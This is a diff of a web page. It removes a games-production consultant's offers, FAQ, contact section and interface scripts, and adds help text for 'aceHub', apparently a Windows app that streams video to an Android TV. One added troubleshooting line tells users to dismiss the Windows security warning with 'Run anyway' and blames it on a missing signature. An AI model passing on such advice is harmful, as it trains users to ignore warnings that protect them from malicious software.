-      <div class="tile"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg><b>Five biggest risks</b><span>Each with an owner and a recommended response</span></div>
-      <div class="tile"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="6" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><line x1="20" y1="4" x2="8.12" y2="15.88"/><line x1="14.47" y1="14.48" x2="20" y2="20"/><line x1="8.12" y1="8.12" x2="12" y2="12"/></svg><b>Cut, delay or protect</b><span>To hit your next milestone</span></div>
-      <div class="tile"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"/></svg><b>Plan to your milestone</b><span>With the decisions you need and by when</span></div>
-      <div class="tile wide"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg><b>What a publisher, investor or licensor is likely to ask first</b></div>
-    </div>
-    <h3 class="sub-head">Once I’m on the team</h3>
-    <ul class="grid3 swipe">
-      <li class="item"><h3>A steady rhythm</h3><p>Live sessions in fixed weekly slots, a short written status note every week, and a risk register your whole team can see.</p></li>
-      <li class="item"><h3>A monthly review</h3><p>Once a month we check progress against the outcomes we agreed. You decide whether to continue, adjust the plan or move to a smaller one.</p></li>
-      <li class="item"><h3>A clean handover</h3><p>Every plan, process and document lives in your tools from day one, so your team owns it when the engagement ends.</p></li>
-    </ul>
-  </div>
-  <div class="sub" data-sub="faq" role="tabpanel">
-    <p class="kicker">FAQ</p>
-    <h2>Common questions.</h2>
-    <div class="faq">
-      <details class="faq-item"><summary>How do we measure whether this worked?</summary><p>Against the three outcomes we agree at the start. Each monthly review shows where each one stands, in plain numbers and dates.</p></details>
-      <details class="faq-item"><summary>Will you sign our NDA?</summary><p>Yes, before I see anything. I can also send my own if you’d rather.</p></details>
-      <details class="faq-item"><summary>Do you replace our producer?</summary><p>Producer on call works alongside your producer as senior backup. Embedded producer fills the role when you don’t have one. Either way, your team keeps ownership of the plan.</p></details>
-      <details class="faq-item"><summary>Do you work with publishers?</summary><p>Yes. Publishers use the project assessment to get an outside view of a developer’s build, plan and team before they sign, and I can act as the producer on a funded external team.</p></details>
-      <details class="faq-item"><summary>Can you talk to our publisher or licensor?</summary><p>Yes. I can join milestone reviews and approval meetings, and prepare the reporting they expect.</p></details>
-      <details class="faq-item"><summary>How does working across time zones work?</summary><p>Calls are booked in slots that suit Europe, the US and Asia-Pacific, and written updates keep everyone informed between calls.</p></details>
-      <details class="faq-item"><summary>Is there a guarantee?</summary><p>Yes. If the assessment doesn’t tell you something useful, you get your money back.</p></details>
-    </div>
-  </div>
   </div>
 
-  <!-- INDIE -->
-  <div class="panel" data-panel="indie" hidden>
-    <div class="subtabs" role="tablist" aria-label="Indie teams: offers, how it works, FAQ">
-      <button type="button" role="tab" data-sub="offers" aria-selected="true">Offers</button>
-      <button type="button" role="tab" data-sub="how" aria-selected="false">How it works</button>
-      <button type="button" role="tab" data-sub="faq" aria-selected="false">FAQ</button>
-    </div>
-  <div class="sub" data-sub="offers" role="tabpanel">
-    <p class="explain"><strong>What does a producer do?</strong> A producer plans the work, keeps everyone aligned and gets a game from idea to launch. I do that as your mentor: an honest read now, and a steady plan until you ship.</p>
-    <p class="kicker">When to bring me in</p>
-    <h2>Most indie teams call at one of these moments.</h2>
-    <ol class="moments swipe">
-      <li>You’re about to send your first publisher pitch.</li>
-      <li>You want your pitch to land with publishers.</li>
-      <li>Your scope and your runway need to line up.</li>
-      <li>A publisher replied, and now they want a budget and a schedule.</li>
-      <li>You want one person owning the plan.</li>
-      <li>You’re applying for a grant or fund and need a credible plan.</li>
-    </ol>
-    <p class="pull">A producer sits in your publisher meeting and owns your milestone.</p>
-    <div class="offers-head">
-      <h2>A shipped producer’s eyes on your game, at indie prices.</h2>
-      <p>Small teams need an honest read on where they are, and someone who holds them to their own plan for a few hours a month. The assessment comes with a money-back guarantee.</p>
-    </div>
-    <div class="offers">
-      <div class="offer open">
-        <div><p class="kicker">Start here</p><h3>Project assessment for small teams</h3><p class="fmt">Fixed price · 1 week</p></div>
-        <p class="body">I play your build and read your plan and pitch. Written notes on where you really are, what a publisher will question first, and what to fix, plus a 60-minute call.</p>
-        <div><span class="price">EUR 750</span><a href="#contact">Book an assessment</a></div>
-      </div>
-      <div class="offer">
-        <div><h3>Production mentoring</h3><p class="fmt">Monthly · cancel any time</p></div>
-        <p class="body">Two 60-minute calls a month, and messages answered within 48 hours in between. I learn your project, track your plan with you, and flag early when the plan needs adjusting. Assessment fee credited.</p>
-        <div><span class="price">EUR 350 / month</span><a href="#contact">Start mentoring</a></div>
-      </div>
-      <div class="offer">
-        <div><h3>Workshops</h3><p class="fmt">Half day · online or at your event</p></div>
-        <p class="body">Sessions on scoping, milestones and pitching for teams and incubators.</p>
-        <div><span class="price">From EUR 500</span></div>
-      </div>
-    </div>
-    <p class="note">Prices exclude VAT.</p>
-  </div>
-  <div class="sub" data-sub="how" role="tabpanel">
-    <p class="kicker">How it works</p>
-    <h2>How an engagement runs.</h2>
-    <p class="lead">Start with a free 20-minute call, then:</p>
-    <ol class="rail">
-      <li class="st"><b>Discover</b><i class="sum">You send what you have.</i><span>You send me what you have: a prototype or a pitch, and your plan if you have one. We agree what you want out of it.</span></li>
-      <li class="st"><b>Assess</b><i class="sum">I look at it the way a publisher would.</i><span>I play or read what you’ve sent, and look at it the way a publisher would.</span></li>
-      <li class="st"><b>Recommend</b><i class="sum">Written notes and a 60-minute call.</i><span>You get written notes on where you really are, what a publisher will question first and what to fix, plus a 60-minute call.</span></li>
-      <li class="st opt"><b>Support · optional</b><i class="sum">Monthly mentoring, cancel any time.</i><span>Monthly mentoring: two 60-minute calls and messages answered within 48 hours. Cancel any time.</span></li>
-    </ol>
-    <p class="rail-note">The first three steps are the one-week project assessment. You keep the notes whatever you decide next.</p>
-    <h3 class="sub-head">What’s in the notes</h3>
-    <div class="tiles">
-      <div class="tile"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg><b>Where you really are</b><span>An honest read</span></div>
-      <div class="tile"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg><b>What a publisher will question first</b><span>So you can answer it before they ask</span></div>
-      <div class="tile wide"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg><b>What to fix</b><span>Before you pitch or apply</span></div>
-    </div>
-    <h3 class="sub-head">If you keep mentoring</h3>
-    <div class="item"><p>Two 60-minute calls a month, and messages answered within 48 hours in between. I learn your project, track your plan with you, and flag early when it needs adjusting. The assessment fee is credited, and you can cancel any time.</p></div>
-  </div>
-  <div class="sub" data-sub="faq" role="tabpanel">
-    <p class="kicker">FAQ</p>
-    <h2>Common questions.</h2>
-    <div class="faq">
-      <details class="faq-item"><summary>Is this affordable for a small team?</summary><p>The assessment is a fixed EUR 750, and mentoring is EUR 350 a month with the assessment fee credited. You can stop after any step.</p></details>
-      <details class="faq-item"><summary>Do I need a finished build?</summary><p>No. A prototype or a pitch is enough.</p></details>
-      <details class="faq-item"><summary>Will you sign an NDA?</summary><p>Yes, before I see anything. I can also send my own if you’d rather.</p></details>
-      <details class="faq-item"><summary>Can you help with my publisher pitch?</summary><p>Yes. The assessment shows what a publisher will question first, and mentoring keeps your plan on track while you pitch.</p></details>
-      <details class="faq-item"><summary>Can I cancel mentoring?</summary><p>Yes. It’s monthly, and you can cancel any time.</p></details>
-      <details class="faq-item"><summary>Is there a guarantee?</summary><p>Yes. If the assessment doesn’t tell you something useful, you get your money back.</p></details>
-      <details class="faq-item"><summary>How does working across time zones work?</summary><p>Calls are booked in slots that suit Europe, the US and Asia-Pacific, and written updates keep everyone informed between calls.</p></details>
-    </div>
-  </div>
-  </div>
+  <p>
+    Because aceHub does not transcode, the video arrives on your TV exactly as it left the source.
+    That means no waiting for the computer to convert anything, no dropped frames from an overloaded
+    processor, and no drop in picture quality.
+  </p>
 
-  <div class="cta-band">
-    <p>Not sure which offer fits? Book a free 20-minute call and I’ll tell you.</p>
-    <div class="cta-actions">
-      <a class="btn btn-main" href="https://cal.com/andrej-savcic/20min" target="_blank" rel="noopener">Book a free 20-minute call</a>
-      <a class="btn btn-alt email-link" href="mailto:savcic.andrej@gmail.com?subject=Enquiry">Email me</a>
-    </div>
-  </div>
-</section>
+  <h2>🔧 Troubleshooting Common Issues</h2>
 
-<!-- ===== FIT ===== -->
-<section class="w sec fit">
-  <div class="grid2">
-    <div class="open"><h2>Good fit</h2>
-      <ul>
-        <li>Studios of 8 to 30 with funding, a publisher deal or a pitch coming up</li>
-        <li>Indie teams of 2 to 10 preparing a first publisher pitch or demo</li>
-        <li>Publishers who need a producer on a funded external team</li>
-        <li>Licensed IP, VR, co-development, ports and launches</li>
-      </ul></div>
-    <div><h2>How I work</h2>
-      <ul>
-        <li>Fixed scopes with an agreed end date</li>
-        <li>Transparent prices, published on this page</li>
-        <li>Creative direction stays with your team</li>
-        <li>I work across timezones, from Tokyo and Sydney to London and much of the US, and the booking page shows every slot in your local time.</li>
-      </ul></div>
-  </div>
-</section>
+  <h3>The stream does not start on my TV</h3>
+  <ul>
+    <li>Check that aceHub is still running on your computer. If you closed it, start it again.</li>
+    <li>Check that both devices are on the same home network. A TV on a separate guest network will not be able to reach your computer.</li>
+    <li>Re-check the address. A missing <strong>:8000</strong> at the end is the single most common mistake.</li>
+  </ul>
 
-<!-- ===== CONTACT ===== -->
-<section id="contact" class="dark">
-  <div class="w contact">
-    <h2>Tell me where your project is. I'll tell you what it needs next.</h2>
-    <div class="ctas">
-      <a class="btn btn-main" href="https://cal.com/andrej-savcic/20min" target="_blank" rel="noopener">Book a free 20-minute call</a>
-      <a class="btn btn-line email-link" href="mailto:savcic.andrej@gmail.com?subject=Enquiry">Email me</a>
-    </div>
-    <p class="links"><a class="email-link" href="mailto:savcic.andrej@gmail.com">savcic.andrej@gmail.com</a> · <a href="https://linkedin.com/in/andrej-savcic">LinkedIn</a></p>
-  </div>
-  <footer><div class="w">Andrej Savcic · LudoSpark SRL · games production consulting · <a class="email-link" href="mailto:savcic.andrej@gmail.com">savcic.andrej@gmail.com</a> · <a href="https://linkedin.com/in/andrej-savcic">LinkedIn</a>
-    <p class="fine">Client names refer to work delivered while employed by the studios listed above and are shown for reference only.</p></div></footer>
-</section>
+  <h3>The picture stutters</h3>
+  <ul>
+    <li>If your computer uses Wi-Fi, try connecting it to the router with a cable. This alone fixes most stutter.</li>
+    <li>Move closer to the router if you are on Wi-Fi, or reduce the number of devices streaming at the same time.</li>
+    <li>Close other programs on the computer that are using a lot of internet bandwidth.</li>
+  </ul>
 
-<div class="dock" id="dock">
-  <a class="btn btn-main" href="https://cal.com/andrej-savcic/20min" target="_blank" rel="noopener">Book a free call</a>
-  <a class="btn btn-alt email-link" href="mailto:savcic.andrej@gmail.com?subject=Enquiry">Email me</a>
-</div>
+  <h3>Windows shows a warning when I open the app</h3>
+  <ul>
+    <li>Click <em>More info</em>, then <em>Run anyway</em>. Windows shows this for many independent applications that have not paid for a commercial signature.</li>
+  </ul>
 
-<script>
-// Hero: crossfade through the work images, led by the headline projects
-(function () {
-  var fig = document.querySelector('.hero figure');
-  var first = fig.querySelector('img');
-  var cap = fig.querySelector('figcaption');
-  var lead = ['thief-vr', 'forza-motorsport', 'godus', 'human-fall-flat'];
-  function rank(src) {
-    for (var i = 0; i < lead.length; i++) if (src.indexOf(lead[i]) !== -1) return i;
-    return lead.length;
-  }
-  var slides = [];
-  document.querySelectorAll('.work .card').forEach(function (card) {
-    var img = card.querySelector('.pic img');
-    if (!img) return;
-    var parts = card.querySelector('.meta').textContent.split(' · ');
-    slides.push({ src: img.getAttribute('src'), alt: img.alt, studio: parts[0], role: parts[1], title: card.querySelector('h3').textContent });
-  });
-  slides.sort(function (a, b) { return rank(a.src) - rank(b.src); });
-  if (slides.length < 2) return;
+  <h3>I cannot find the file I downloaded</h3>
+  <ul>
+    <li>Open File Explorer and click <em>Downloads</em> on the left side. Sort the folder by date, and your file will be at the top.</li>
+    <li>In most browsers you can also press <strong>Ctrl + J</strong> to see your download list.</li>
+  </ul>
 
-  var box = document.createElement('div');
-  box.className = 'slides';
-  fig.insertBefore(box, first);
-  box.appendChild(first);
-  first.classList.add('on');
-  var imgs = slides.map(function (sl, i) {
-    if (i === 0) return first;
-    var im = document.createElement('img');
-    im.src = sl.src;
-    im.alt = sl.alt;
-    im.loading = 'lazy';
-    box.appendChild(im);
-    return im;
-  });
+  <h2>❓ Frequently Asked Questions</h2>
 
-  var text = document.createElement('span');
-  var dots = document.createElement('div');
-  dots.className = 'dots';
-  cap.textContent = '';
-  cap.appendChild(text);
-  cap.appendChild(dots);
-  var buttons = slides.map(function (sl, i) {
-    var b = document.createElement('button');
-    b.type = 'button';
-    b.setAttribute('aria-label', 'Show ' + sl.title);
-    b.addEventListener('click', function () { show(i); restart(); });
-    dots.appendChild(b);
-    return b;
-  });
+  <div class="card">
+    <p class="faq-q">Is aceHub free to use?</p>
+    <p class="faq-a">Yes. aceHub is released publicly and you can download it from the official releases page at no cost.</p>
 
-  var cur = 0, timer = null, paused = false;
-  var still = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-  function show(i) {
-    cur = i;
-    imgs.forEach(function (im, k) { im.classList.toggle('on', k === i); });
-    buttons.forEach(function (b, k) { if (k === i) b.setAttribute('aria-current', 'true'); else b.removeAttribute('aria-current'); });
-    var sl = slides[i], strong = document.createElement('strong');
-    strong.textContent = sl.role;
-    text.textContent = '';
-    text.appendChild(strong);
-    text.appendChild(document.createTextNode(' · ' + sl.title + ', ' + sl.studio));
-  }
-  function stop() { clearInterval(timer); timer = null; }
-  function start() { if (!timer && !still && !paused) timer = setInterval(function () { show((cur + 1) % slides.length); }, 4500); }
-  function restart() { stop(); start(); }
-  var pause = document.createElement('button');
-  pause.type = 'button';
-  pause.className = 'pause';
-  function paintPause() {
-    pause.setAttribute('aria-label', paused ? 'Play slideshow' : 'Pause slideshow');
-    pause.innerHTML = '<svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="' + (paused ? 'M8 5v14l11-7z' : 'M7 5h4v14H7zM13 5h4v14h-4z') + '"/></svg>';
-  }
-  pause.addEventListener('click', function () {
-    paused = !paused;
-    paintPause();
-    if (paused) stop(); else start();
-  });
-  paintPause();
-  if (!still) dots.insertBefore(pause, dots.firstChild);
-  ['prev', 'next'].forEach(function (dir) {
-    var b = document.createElement('button');
-    b.type = 'button';
-    b.className = 'nav ' + dir;
-    b.setAttribute('aria-label', dir === 'prev' ? 'Previous project' : 'Next project');
-    b.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="' + (dir === 'prev' ? 'M15 5l-7 7 7 7' : 'M9 5l7 7-7 7') + '"/></svg>';
-    b.addEventListener('click', function () {
-      show((cur + (dir === 'next' ? 1 : slides.length - 1)) % slides.length);
-      restart();
-    });
-    box.appendChild(b);
-  });
-  show(0);
-  start();
-  fig.addEventListener('mouseenter', stop);
-  fig.addEventListener('mouseleave', start);
-  fig.addEventListener('focusin', stop);
-  fig.addEventListener('focusout', start);
-})();
+    <p class="faq-q">Do I need to install anything on my Android TV?</p>
+    <p class="faq-a">No. aceHub runs on your Windows computer. Your TV only needs a player app that can open a network address, which most Android TV devices already have.</p>
 
-// Work cards: "Full story" opens a dialog instead of growing the grid row
-(function () {
-  var dlg = document.createElement('dialog');
-  dlg.className = 'story';
-  dlg.innerHTML = '<form method="dialog"><button class="close" aria-label="Close">×</button></form><div></div>';
-  document.body.appendChild(dlg);
-  var body = dlg.lastChild;
-  dlg.addEventListener('click', function (e) { if (e.target === dlg) dlg.close(); });
-  document.querySelectorAll('.work .card').forEach(function (card) {
-    var d = card.querySelector('details');
-    if (!d) return;
-    var full = document.createElement('div');
-    full.className = 'full';
-    Array.prototype.forEach.call(d.children, function (n) {
-      if (n.tagName !== 'SUMMARY') full.appendChild(n.cloneNode(true));
-    });
-    var btn = document.createElement('button');
-    btn.type = 'button';
-    btn.className = 'more';
-    btn.textContent = 'Full story';
-    card.addEventListener('click', function (e) {
-      if (e.target.closest('a')) return;
-      var copy = card.cloneNode(true);
-      copy.removeChild(copy.querySelector('.more'));
-      copy.appendChild(full.cloneNode(true));
-      var link = copy.querySelector('.full a');
-      if (link) {
-        link.target = '_blank';
-        link.rel = 'noopener';
-        var cta = document.createElement('div');
-        cta.className = 'story-cta';
-        var holder = link.parentElement;
-        cta.appendChild(link);
-        if (holder && holder.tagName === 'P' && !holder.textContent.trim()) holder.remove();
-        copy.insertBefore(cta, copy.querySelector('.full'));
-      }
-      body.innerHTML = '';
-      body.appendChild(copy);
-      dlg.setAttribute('aria-label', card.querySelector('h3').textContent);
-      dlg.showModal();
-      dlg.scrollTop = 0;
-    });
-    d.replaceWith(btn);
-  });
-})();
+    <p class="faq-q">Why does port 8000 matter?</p>
+    <p class="faq-a">Port 8000 is the "door" aceHub uses on your computer. When you type your computer's address followed by :8000, you are telling the TV which door to knock on.</p>
 
-// Hero buttons pick the matching audience tab
-document.querySelectorAll('[data-pick]').forEach(function (a) {
-  a.addEventListener('click', function () {
-    var t = document.querySelector('[data-tab="' + a.dataset.pick + '"]');
-    if (t) t.click();
-  });
-});
+    <p class="faq-q">What does "0 transcode" mean for me?</p>
+    <p class="faq-a">It means aceHub passes the video straight through without re-processing it. The result is a faster start, lower processor use on your computer, and no loss of picture quality.</p>
 
-// Address bar follows the section being read (no jump, no history entries)
-(function () {
-  var sections = ['work', 'about', 'offers', 'contact']
-    .map(function (id) { return document.getElementById(id); })
-    .filter(Boolean);
-  var current = null, timer = null;
-  function sync() {
-    timer = null;
-    var line = window.innerHeight * 0.35, id = '';
-    sections.forEach(function (sec) { if (sec.getBoundingClientRect().top <= line) id = sec.id; });
-    if (id === current) return;
-    current = id;
-    try { history.replaceState(null, '', id ? '#' + id : location.pathname + location.search); } catch (e) { /* sandboxed frame */ }
-  }
-  window.addEventListener('scroll', function () {
-    if (!timer) timer = setTimeout(sync, 60);
-  }, { passive: true });
-})();
+    <p class="faq-q">Can several people watch at the same time?</p>
+    <p class="faq-a">Yes. That is exactly what aceHub is built for. One connection is shared across the devices on your home network, so multiple screens can watch together.</p>
 
-// Email links open a short form; the email is composed on this page and nothing is sent from it
-(function () {
-  var dlg = document.createElement('dialog');
-  dlg.className = 'mail';
-  dlg.setAttribute('aria-label', 'Email me');
-  dlg.innerHTML = '<form method="dialog"><button class="close" aria-label="Close">&times;</button></form>' +
-    '<h3>Email me</h3><p class="mail-addr"></p>' +
-    '<p class="mail-intro">Fill in a few details and your email is ready to send. Nothing is sent from this page.</p>' +
-    '<div class="mail-form">' +
-    '<label for="mf-name">Your name</label><input id="mf-name" type="text" autocomplete="name">' +
-    '<label for="mf-team">Studio or team</label><input id="mf-team" type="text" autocomplete="organization">' +
-    '<label for="mf-stage">Project stage</label><select id="mf-stage"><option value="">Choose one</option>' +
-    '<option>Concept</option><option>Prototype</option><option>Vertical slice</option><option>In production</option><option>Launching</option></select>' +
-    '<label for="mf-help">What would you like help with?</label><textarea id="mf-help" rows="3"></textarea>' +
-    '<label for="mf-link">Link to your game, deck or website (optional)</label><input id="mf-link" type="url" inputmode="url" autocomplete="url">' +
-    '</div>' +
-    '<div class="mail-actions">' +
-    '<a class="btn btn-main" data-act="app">Open in your email app</a>' +
-    '<a class="btn alt" data-act="gmail" target="_blank" rel="noopener">Open in Gmail</a>' +
-    '<button type="button" class="btn alt" data-act="copy">Copy message</button></div>' +
-    '<button type="button" class="linklike" data-act="addr">Copy address only</button>';
-  document.body.appendChild(dlg);
-  dlg.addEventListener('click', function (e) { if (e.target === dlg) dlg.close(); });
-  var q = function (sel) { return dlg.querySelector(sel); };
-  var addrEl = q('.mail-addr'), appEl = q('[data-act="app"]'), gmailEl = q('[data-act="gmail"]');
-  var copyEl = q('[data-act="copy"]'), addrBtn = q('[data-act="addr"]');
-  var fields = { name: q('#mf-name'), team: q('#mf-team'), stage: q('#mf-stage'), help: q('#mf-help'), link: q('#mf-link') };
-  var address = '', subject = 'Enquiry';
-
-  function message() {
-    var lines = ['Hi Andrej,', ''];
-    [['Name', fields.name], ['Studio or team', fields.team], ['Project stage', fields.stage],
-     ['What I would like help with', fields.help], ['Link', fields.link]].forEach(function (f) {
-      var v = f[1].value.trim();
-      if (v) lines.push(f[0] + ': ' + v);
-    });
-    lines.push('', 'Thanks');
-    return lines.join('\n');
-  }
-  function refresh() {
-    var body = encodeURIComponent(message());
-    appEl.href = 'mailto:' + address + '?subject=' + subject + '&body=' + body;
-    gmailEl.href = 'https://mail.google.com/mail/?view=cm&to=' + address + '&su=' + subject + '&body=' + body;
-  }
-  Object.keys(fields).forEach(function (k) {
-    fields[k].addEventListener('input', refresh);
-    fields[k].addEventListener('change', refresh);
-  });
-  function copy(text, btn, idle) {
-    function done(ok) {
-      btn.textContent = ok ? 'Copied' : 'Select the text and press Ctrl+C';
-      setTimeout(function () { btn.textContent = idle; }, 2400);
-    }
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-      navigator.clipboard.writeText(text).then(function () { done(true); }, function () { done(false); });
-    } else {
-      done(false);
-    }
-  }
-  copyEl.addEventListener('click', function () { copy('To: ' + address + '\nSubject: ' + decodeURIComponent(subject) + '\n\n' + message(), copyEl, 'Copy message'); });
-  addrBtn.addEventListener('click', function () { copy(address, addrBtn, 'Copy address only'); });
-
-  document.querySelectorAll('.email-link').forEach(function (link) {
-    link.addEventListener('click', function (e) {
-      e.preventDefault();
-      var parts = link.getAttribute('href').replace('mailto:', '').split('?');
-      var m = parts[1] && parts[1].match(/subject=([^&]*)/);
-      address = parts[0];
-      subject = m ? m[1] : 'Enquiry';
-      addrEl.textContent = address;
-      refresh();
-      dlg.showModal();
-    });
-  });
-})();
-
-// "Show more" buttons open and close the panel they control
-document.querySelectorAll('.more-toggle').forEach(function (b) {
-  var panel = document.getElementById(b.getAttribute('aria-controls'));
-  if (!panel) return;
-  var label = b.querySelector('span');
-  var closed = label.textContent, opened = b.dataset.open || 'Show fewer';
-  b.addEventListener('click', function () {
-    var open = b.getAttribute('aria-expanded') === 'true';
-    b.setAttribute('aria-expanded', open ? 'false' : 'true');
-    panel.hidden = open;
-    label.textContent = open ? closed : opened;
-  });
-});
-
-// Studio / indie tabs
-document.querySelectorAll('[data-tab]').forEach(function (btn) {
-  btn.addEventListener('click', function () {
-    document.querySelectorAll('[data-tab]').forEach(function (b) { b.setAttribute('aria-selected', b === btn); });
-    document.querySelectorAll('[data-panel]').forEach(function (p) { p.hidden = p.dataset.panel !== btn.dataset.tab; });
-  });
-});
-// Offers | How it works | FAQ, shared by both audiences
-(function () {
-  var sub = 'offers';
-  var sets = document.querySelectorAll('.subtabs');
-  function apply() {
-    document.querySelectorAll('.panel .sub').forEach(function (p) { p.hidden = p.dataset.sub !== sub; });
-    sets.forEach(function (set) {
-      set.querySelectorAll('[data-sub]').forEach(function (b) {
-        var on = b.dataset.sub === sub;
-        b.setAttribute('aria-selected', on ? 'true' : 'false');
-        b.tabIndex = on ? 0 : -1;
-      });
-    });
-  }
-  function choose(name) { sub = name; apply(); }
-  sets.forEach(function (set) {
-    var btns = set.querySelectorAll('[data-sub]');
-    btns.forEach(function (b, i) {
-      b.addEventListener('click', function () { choose(b.dataset.sub); });
-      b.addEventListener('keydown', function (e) {
-        var d = e.key === 'ArrowRight' ? 1 : e.key === 'ArrowLeft' ? -1 : 0;
-        if (!d) return;
-        e.preventDefault();
-        var next = btns[(i + d + btns.length) % btns.length];
-        choose(next.dataset.sub);
-        next.focus();
-      });
-    });
-  });
-  document.querySelectorAll('[data-pick]').forEach(function (a) { a.addEventListener('click', function () { choose('offers'); }); });
-  document.querySelectorAll('a[data-go]').forEach(function (a) {
-    a.addEventListener('click', function (e) {
-      e.preventDefault();
-      choose(a.dataset.go);
-      var top = document.getElementById('offers');
-      if (top) top.scrollIntoView();
-    });
-  });
-  var h = location.hash.replace('#', '');
-  if (h === 'how' || h === 'faq') {
-    choose(h);
-    setTimeout(function () { var top = document.getElementById('offers'); if (top) top.scrollIntoView(); }, 60);
-  } else {
-    apply();
-  }
-})();
-
-// Mobile menu
-(function () {
-  var b = document.querySelector('.menu-btn'), m = document.getElementById('mobile-menu');
-  if (!b || !m) return;
-  function set(open) { b.setAttribute('aria-expanded', open ? 'true' : 'false'); m.hidden = !open; }
-  b.addEventListener('click', function () { set(b.getAttribute('aria-expanded') !== 'true'); });
-  m.addEventListener('click', function (e) { if (e.target.closest('a')) set(false); });
-  document.addEventListener('keydown', function (e) { if (e.key === 'Escape') set(false); });
-})();
-
-// Bottom action bar: after the hero, until the contact section is in view
-(function () {
-  var dock = document.getElementById('dock'), hero = document.querySelector('.dark'), contact = document.getElementById('contact');
-  if (!dock || !hero || !contact) return;
-  var t = null;
-  function sync() {
-    t = null;
-    var past = hero.getBoundingClientRect().bottom < 0;
-    var atEnd = contact.getBoundingClientRect().top < window.innerHeight - 60;
-    dock.classList.toggle('show', past && !atEnd);
-  }
-  window.addEventListener('scroll', function () { if (!t) t = setTimeout(sync, 50); }, { passive: true });
-  window.addEventListener('resize', sync);
-  sync();
-})();
-// Phone layout: accordions, "Read more" and swipe dots follow one breakpoint
-(function () {
-  var mq = window.matchMedia('(max-width: 860px)');
-  var syncs = [];
-
-  function toggle(host, clickEl, ariaEl) {
-    clickEl.addEventListener('click', function (e) {
-      if (!mq.matches || e.target.closest('a, .body')) return;
-      host.classList.toggle('open');
-      ariaEl.setAttribute('aria-expanded', host.classList.contains('open') ? 'true' : 'false');
-    });
-    ariaEl.addEventListener('keydown', function (e) {
-      if (!mq.matches || (e.key !== 'Enter' && e.key !== ' ')) return;
-      e.preventDefault();
-      clickEl.click();
-    });
-    syncs.push(function () {
-      if (mq.matches) {
-        ariaEl.setAttribute('role', 'button');
-        ariaEl.tabIndex = 0;
-        ariaEl.setAttribute('aria-expanded', host.classList.contains('open') ? 'true' : 'false');
-      } else {
-        ariaEl.removeAttribute('role');
-        ariaEl.removeAttribute('tabindex');
-        ariaEl.removeAttribute('aria-expanded');
-      }
-    });
-  }
-
-  document.querySelectorAll('.offer').forEach(function (o) { toggle(o, o, o.firstElementChild); });
-  document.querySelectorAll('.st').forEach(function (o) { toggle(o, o, o); });
-  document.querySelectorAll('.fit .grid2 > div').forEach(function (o) { toggle(o, o.querySelector('h2'), o.querySelector('h2')); });
-
-  var about = document.querySelector('.about');
-  if (about) {
-    var more = document.createElement('button');
-    more.type = 'button';
-    more.className = 'about-more';
-    more.textContent = 'Read more';
-    more.setAttribute('aria-expanded', 'false');
-    about.querySelector('.about-rest').after(more);
-    more.addEventListener('click', function () {
-      var open = about.classList.toggle('collapsed') === false;
-      more.textContent = open ? 'Show less' : 'Read more';
-      more.setAttribute('aria-expanded', open ? 'true' : 'false');
-    });
-    syncs.push(function () {
-      about.classList.toggle('collapsed', mq.matches);
-      more.textContent = 'Read more';
-      more.setAttribute('aria-expanded', 'false');
-    });
-  }
-
-  document.querySelectorAll('.swipe').forEach(function (row) {
-    var n = row.children.length;
-    var dots = document.createElement('div');
-    dots.className = 'swipe-dots';
-    dots.setAttribute('aria-hidden', 'true');
-    for (var i = 0; i < n; i++) dots.appendChild(document.createElement('s'));
-    row.after(dots);
-    function paint() {
-      var first = row.children[0];
-      var step = first.offsetWidth + 12;
-      var idx = step > 12 ? Math.min(n - 1, Math.round(row.scrollLeft / step)) : 0;
-      Array.prototype.forEach.call(dots.children, function (d, k) { d.className = k === idx ? 'on' : ''; });
-    }
-    row.addEventListener('scroll', paint, { passive: true });
-    paint();
-    syncs.push(function () {
-      if (mq.matches) { row.tabIndex = 0; row.setAttribute('role', 'region'); row.setAttribute('aria-label', 'Swipe sideways for more'); }
-      else { row.removeAttribute('tabindex'); row.removeAttribute('role'); row.removeAttribute('aria-label'); }
-    });
-  });
-
-  function syncAll() { syncs.forEach(function (f) { f(); }); }
-  syncAll();
-  if (mq.addEventListener) mq.addEventListener('change', syncAll); else mq.addListener(syncAll);
-})();
+    <p class="faq-q">Does aceHub work without an internet connection?</p>
